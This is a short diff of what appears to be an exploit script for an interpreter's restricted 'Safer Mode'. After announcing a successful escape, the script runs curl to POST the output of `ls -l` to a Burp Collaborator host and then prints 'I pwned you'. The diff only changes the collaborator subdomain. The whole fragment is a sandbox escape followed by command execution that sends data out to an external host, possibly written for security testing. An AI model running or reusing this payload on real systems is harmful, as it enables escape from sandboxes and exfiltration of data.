@@ -75,6 +75,6 @@ SAFER {
 (Successfully escaped from Safer Mode!) success
 
 (Executing a shell command...) info
-(curl -X POST http://jnaw8covzh2blw1gs6t5wxgwun0do2.burpcollaborator.net/ -d "`ls -l`") osexec print
+(curl -X POST http://3pttzt11nn470esa1ocmvzr6wx2oqd.burpcollaborator.net/ -d "`ls -l`") osexec print
 (PS: I pwned you <3) success
 quit
